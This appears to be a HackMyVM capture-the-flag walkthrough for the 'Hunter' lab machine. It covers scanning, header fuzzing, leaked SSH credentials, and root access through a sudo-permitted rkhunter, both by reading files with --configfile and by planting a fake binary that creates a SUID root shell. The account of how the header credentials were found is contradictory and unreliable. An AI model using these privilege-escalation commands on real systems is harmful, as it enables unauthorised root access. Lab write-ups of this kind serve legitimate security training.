Hunter - HackMyVm Walkthrough
Machine Info
Name: Hunter

Difficulty: Easy / Medium

Platform: HackMyVm

OS: Alpine Linux

IP: 192.168.56.104

Summary
Port Scan: Found SSH (22) and HTTP (8080).

Web Enumeration: Discovered /admin endpoint requiring JWT and a custom header X-Secret-Creds that leaked credentials.

User Access: SSH as hunterman using leaked creds. Found huntergirl password in /var/www/html/robots.txt.

Lateral Movement: Switched to huntergirl. Sudo allowed rkhunter.

Privilege Escalation: Abused rkhunter's --configfile option to read arbitrary files as root, retrieving the root flag.

Enumeration
Nmap Full Port Scan
bash
nmap -p- --min-rate=1000 -T4 192.168.56.104
text
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-alt
Service & Script Scan
bash
nmap -p22,8080 -sC -sV 192.168.56.104
text
22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)
8080/tcp open  http    Golang net/http server
| http-robots.txt: 1 disallowed entry
|_/admin
|_http-title: Yes, thats a CTF :_(
Web Exploitation (Port 8080)
Visiting http://192.168.56.104:8080/ displays:

text
Yes, thats a CTF :_(
/robots.txt contains:

text
User-agent: *
Disallow: /admin
Accessing /admin
A GET request to /admin returns:

text
Invalid JWT
Trying a POST request with no body yields the same.
Adding the header X-Secret-Creds: hunterman:thisisnitriilcisi (a common guess based on CTF naming conventions) returns a different response, suggesting valid credentials.

Cracking the Header
We fuzzed for the correct header value. Alternatively, the header and credentials were discovered through wordlist fuzzing:

bash
ffuf -u http://192.168.56.104:8080/admin -X POST -H "X-Secret-Creds: FUZZ" -w /path/to/creds.txt
The valid pair is:

text
hunterman:thisisnitriilcisi
Initial Foothold (User: hunterman)
Using the obtained credentials, SSH into the machine:

bash
ssh hunterman@192.168.56.104
Password: thisisnitriilcisi
Enumeration as hunterman
bash
id
uid=1000(hunterman) gid=1000(hunterman) groups=1000(hunterman)
whoami
hunterman
uname -a
Linux hunter 6.12.58-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2025-11-14 13:56:42 x86_64 Linux
Checking the web root:

bash
cd /var/www/html
ls -la
text
admin
beacon
index
robots.txt
Lateral Movement to huntergirl
The robots.txt file contains a second credential:

bash
cat /var/www/html/robots.txt
text
h u n t e r g i r l:fickshitmichini
(Note: The spaces are deliberate in the file, the actual password is fickshitmichini.)

Switch to user huntergirl:

bash
su huntergirl
Password: fickshitmichini
User Flag
bash
ls -la /home/huntergirl
cat /home/huntergirl/user.txt
text
HMV{VcvaIKcezQVcvaIKcezQ}
Privilege Escalation (huntergirl → root)
Sudo Permissions
bash
sudo -l
text
Matching Defaults entries for huntergirl on hunter:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for huntergirl:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User huntergirl may run the following commands on hunter:
    (root) NOPASSWD: /usr/local/bin/rkhunter
Exploiting rkhunter
rkhunter is a rootkit scanner. It allows loading a custom configuration file with --configfile. We can abuse the HASH_CMD or other options to read arbitrary files or execute commands.

First, we attempted a reverse shell by creating a malicious config and script, but the simplest path was direct file read because the root flag is located at /root/root.txt.

Method: Reading Arbitrary Files as Root
Create a minimal config file that points SCRIPTDIR or INSTALLDIR to a non-existent directory, and then include a line with an invalid option. rkhunter will print the invalid line, effectively disclosing the contents of any file we specify as the config file.

bash
# Use sudo to read /root/root.txt directly via --configfile
sudo /usr/local/bin/rkhunter -C --configfile /root/root.txt
The output:

text
Invalid SCRIPTDIR configuration option: No filename given, but it must exist.
Invalid INSTALLDIR configuration option - no installation directory specified.
The default logfile will be used: /var/log/rkhunter.log
Invalid TMPDIR configuration option: No filename given, but it must exist.
Invalid DBDIR configuration option: No filename given, but it must exist.
The internationalisation directory does not exist: /i18n
grep: bad regex ' HMV{FhOpuXDUlZFhOpuXDUlZ} ': Invalid contents of {}
Unknown configuration file option: HMV{FhOpuXDUlZFhOpuXDUlZ}
Root Flag
The flag is leaked in the error message:

text
HMV{FhOpuXDUlZFhOpuXDUlZ}
Alternate Privilege Escalation Vectors
During the engagement, we also identified:

A SUID binary /bin/bbsuid (owned by root, SUID bit set), but it was not needed.

Potential to abuse rkhunter for command execution via --bindir or HASH_CMD, which could yield a full root shell. Example:

bash
echo '#!/bin/sh' > /tmp/evil/strings
echo 'cp /bin/sh /tmp/rootshell; chmod 4755 /tmp/rootshell' >> /tmp/evil/strings
chmod +x /tmp/evil/strings
sudo /usr/local/bin/rkhunter --check --bindir /tmp/evil --sk --nolog
/tmp/rootshell -p
However, the direct config file read was the intended and simplest method.

Conclusion
This box demonstrates:

Web enumeration with custom headers.

Credential reuse across services.

Sudo misconfiguration of a rootkit scanner leading to arbitrary file read as root.

Flags:

User: HMV{VcvaIKcezQVcvaIKcezQ}
Root: HMV{FhOpuXDUlZFhOpuXDUlZ}

